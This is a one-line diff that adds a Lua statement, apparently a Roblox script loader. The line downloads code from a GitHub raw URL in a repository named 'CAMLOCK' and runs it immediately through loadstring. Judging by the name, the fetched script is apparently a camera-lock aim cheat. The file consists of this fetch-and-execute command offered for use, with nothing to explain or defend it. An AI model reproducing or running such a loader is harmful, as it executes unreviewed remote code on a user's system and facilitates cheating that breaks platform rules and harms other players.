@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/brosula123/CAMLOCK/main/SKIBIDI"))()
